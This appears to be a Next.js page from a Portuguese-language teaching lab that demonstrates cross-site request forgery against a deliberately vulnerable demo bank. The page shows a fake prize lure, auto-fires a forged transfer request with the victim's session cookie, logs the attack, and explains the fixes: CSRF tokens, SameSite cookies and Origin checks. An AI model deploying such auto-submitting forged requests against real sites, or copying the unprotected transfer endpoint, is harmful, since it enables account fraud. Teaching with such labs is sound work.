'use client'

import { useEffect, useState } from 'react'
import { useRouter } from 'next/navigation'

type AttackStatus = 'idle' | 'attacking' | 'success' | 'failed'

interface AttackLog {
  time: string
  message: string
  type: 'info' | 'success' | 'error' | 'warn'
}

export default function AttackerPage() {
  const [status, setStatus] = useState<AttackStatus>('idle')
  const [logs, setLogs] = useState<AttackLog[]>([])
  const [transferResult, setTransferResult] = useState<string | null>(null)
  const [showExplain, setShowExplain] = useState(false)
  const router = useRouter()

  function addLog(message: string, type: AttackLog['type'] = 'info') {
    const time = new Date().toLocaleTimeString('pt-BR')
    setLogs(prev => [...prev, { time, message, type }])
  }

  async function executeAttack() {
    setStatus('attacking')
    setLogs([])

    addLog('Vítima acessou a página. Iniciando ataque CSRF...', 'warn')

    await delay(800)
    addLog('Verificando se vítima possui sessão ativa...', 'info')

    await delay(600)
    addLog('Cookie "session_id" será enviado automaticamente pelo navegador!', 'warn')

    await delay(700)
    addLog('Disparando requisição POST para http://localhost:3000/api/transfer', 'info')
    addLog('  → Payload: { "to": "bob", "amount": 5000 }', 'info')
    addLog('  → Cookie: session_id=<token_da_vitima> (anexado automaticamente)', 'warn')

    await delay(500)

    try {
      // Esta é a requisição forjada — o cookie de sessão é enviado automaticamente
      // porque o navegador inclui cookies de same-origin em toda requisição
      const res = await fetch('/api/transfer', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ to: 'bob', amount: 5000 }),
        // Nota: credentials: 'include' é implícito para same-origin
        // Em ataque cross-origin real, precisaria que o cookie fosse SameSite=None
      })

      const data = await res.json()

      if (res.ok) {
        addLog(`✅ TRANSFERÊNCIA EXECUTADA: ${data.message}`, 'success')
        addLog(`   Novo saldo da vítima: R$ ${data.newBalance?.toLocaleString('pt-BR')}`, 'success')
        setTransferResult(data.message)
        setStatus('success')
      } else {
        addLog(`Transferência falhou: ${data.error}`, 'error')
        setStatus('failed')
      }
    } catch {
      addLog('Erro de rede ao tentar executar o ataque', 'error')
      setStatus('failed')
    }
  }

  // Inicia o ataque automaticamente após 1s (simulando script malicioso oculto)
  useEffect(() => {
    const timer = setTimeout(() => {
      executeAttack()
    }, 1000)
    return () => clearTimeout(timer)
  }, [])

  return (
    <div className="min-h-screen bg-gray-900 text-gray-100">
      {/* Cabeçalho falso — disfarce da página maliciosa */}
      <div className="bg-gradient-to-r from-orange-500 to-red-600 p-4 text-center">
        <h1 className="text-2xl font-bold">🎉 Você foi selecionado para um prêmio especial!</h1>
        <p className="text-sm mt-1 opacity-90">Clique abaixo para resgatar sua recompensa exclusiva</p>
      </div>

      <div className="max-w-3xl mx-auto p-6 space-y-6">
        {/* Conteúdo falso visível ao usuário */}
        <div className="bg-gray-800 rounded-xl p-6 text-center">
          <div className="text-6xl mb-4">🏆</div>
          <p className="text-gray-400 text-sm">
            Esta é a página que o atacante mostra ao usuário.
            <br />
            Enquanto você vê isso, um script está sendo executado em segundo plano...
          </p>
        </div>

        {/* Terminal de logs do ataque */}
        <div className="bg-black rounded-xl overflow-hidden">
          <div className="bg-gray-800 px-4 py-2 flex items-center gap-2">
            <div className="w-3 h-3 rounded-full bg-red-500" />
            <div className="w-3 h-3 rounded-full bg-yellow-500" />
            <div className="w-3 h-3 rounded-full bg-green-500" />
            <span className="ml-2 text-xs text-gray-400">Terminal do Atacante — script oculto</span>
          </div>
          <div className="p-4 font-mono text-xs space-y-1 min-h-48">
            {logs.length === 0 && (
              <p className="text-gray-600">Aguardando execução...</p>
            )}
            {logs.map((log, i) => (
              <div key={i} className={`
                ${log.type === 'success' ? 'text-green-400' : ''}
                ${log.type === 'error' ? 'text-red-400' : ''}
                ${log.type === 'warn' ? 'text-yellow-400' : ''}
                ${log.type === 'info' ? 'text-gray-300' : ''}
              `}>
                <span className="text-gray-600">[{log.time}]</span> {log.message}
              </div>
            ))}
            {status === 'attacking' && (
              <div className="text-blue-400 animate-pulse">▋</div>
            )}
          </div>
        </div>

        {/* Resultado do ataque */}
        {status === 'success' && (
          <div className="bg-red-900 border border-red-500 rounded-xl p-5">
            <h2 className="text-red-400 font-bold text-lg flex items-center gap-2">
              <span>💀</span> ATAQUE CSRF BEM-SUCEDIDO
            </h2>
            <p className="text-red-300 mt-2 text-sm">{transferResult}</p>
            <p className="text-red-400 text-sm mt-2">
              A vítima não clicou em nada. A transferência ocorreu automaticamente
              porque o navegador enviou o cookie de sessão com a requisição forjada.
            </p>
          </div>
        )}

        {status === 'failed' && (
          <div className="bg-yellow-900 border border-yellow-500 rounded-xl p-5">
            <h2 className="text-yellow-400 font-bold">Ataque bloqueado ou falhou</h2>
            <p className="text-yellow-300 text-sm mt-2">
              Possíveis razões: saldo insuficiente, usuário não logado, ou proteção SameSite ativa.
              <br />
              Faça login como <strong>alice</strong> e tente novamente.
            </p>
          </div>
        )}

        {/* Botão para ver explicação técnica */}
        <button
          onClick={() => setShowExplain(!showExplain)}
          className="w-full bg-gray-700 hover:bg-gray-600 text-white py-3 rounded-xl text-sm font-medium transition-colors"
        >
          {showExplain ? '▲ Ocultar' : '▼ Ver'} Explicação Técnica do Ataque
        </button>

        {showExplain && (
          <div className="bg-gray-800 rounded-xl p-6 space-y-4 text-sm">
            <h3 className="font-bold text-white text-base">Como o ataque CSRF funciona aqui</h3>

            <div className="space-y-3 text-gray-300">
              <div className="bg-gray-700 rounded-lg p-3">
                <p className="text-yellow-400 font-mono text-xs mb-1">// 1. A vítima está logada no SafeBank</p>
                <p>O navegador armazena o cookie <code className="bg-gray-900 px-1 rounded">session_id</code>
                  {' '}que identifica a sessão autenticada.</p>
              </div>

              <div className="bg-gray-700 rounded-lg p-3">
                <p className="text-yellow-400 font-mono text-xs mb-1">// 2. A vítima acessa uma página maliciosa</p>
                <p>Pode ser um link de e-mail, banner, ou página disfarçada.
                  O script na página executa automaticamente.</p>
              </div>

              <div className="bg-gray-700 rounded-lg p-3">
                <p className="text-yellow-400 font-mono text-xs mb-1">// 3. O script forja uma requisição</p>
                <pre className="text-green-400 text-xs mt-1 overflow-x-auto">{`fetch('http://localhost:3000/api/transfer', {
  method: 'POST',
  body: JSON.stringify({ to: 'bob', amount: 5000 })
})
// O navegador ANEXA o cookie automaticamente!`}</pre>
              </div>

              <div className="bg-gray-700 rounded-lg p-3">
                <p className="text-yellow-400 font-mono text-xs mb-1">// 4. O servidor processa como legítimo</p>
                <p>O endpoint <code className="bg-gray-900 px-1 rounded">/api/transfer</code> só verifica
                  o cookie de sessão — não há token CSRF. A transferência é executada.</p>
              </div>

              <div className="bg-gray-700 rounded-lg p-3">
                <p className="text-red-400 font-mono text-xs mb-1">// Código vulnerável (/api/transfer/route.ts)</p>
                <pre className="text-gray-300 text-xs">{`// ❌ Não verifica CSRF token
// ❌ Não verifica Origin/Referer
// ❌ Cookie sem SameSite=Strict
const sessionId = request.cookies.get('session_id')?.value
// Se válido, executa a transferência diretamente`}</pre>
              </div>

              <div className="bg-green-900 rounded-lg p-3">
                <p className="text-green-400 font-mono text-xs mb-1">// Correção — como proteger</p>
                <pre className="text-green-300 text-xs">{`// ✅ Gerar token CSRF na sessão
// ✅ Incluir token no formulário (campo oculto)
// ✅ Validar token no servidor
// ✅ Cookie com SameSite=Strict
// ✅ Validar header Origin na ação`}</pre>
              </div>
            </div>
          </div>
        )}

        <div className="flex gap-3">
          <button
            onClick={() => router.push('/dashboard')}
            className="flex-1 bg-blue-600 hover:bg-blue-700 text-white py-2 rounded-lg text-sm font-medium"
          >
            ← Voltar ao Dashboard (ver saldo)
          </button>
          <button
            onClick={() => {
              setStatus('idle')
              setLogs([])
              setTransferResult(null)
              setTimeout(executeAttack, 500)
            }}
            className="flex-1 bg-gray-600 hover:bg-gray-500 text-white py-2 rounded-lg text-sm font-medium"
          >
            🔄 Repetir Ataque
          </button>
        </div>
      </div>
    </div>
  )
}

function delay(ms: number) {
  return new Promise(resolve => setTimeout(resolve, ms))
}
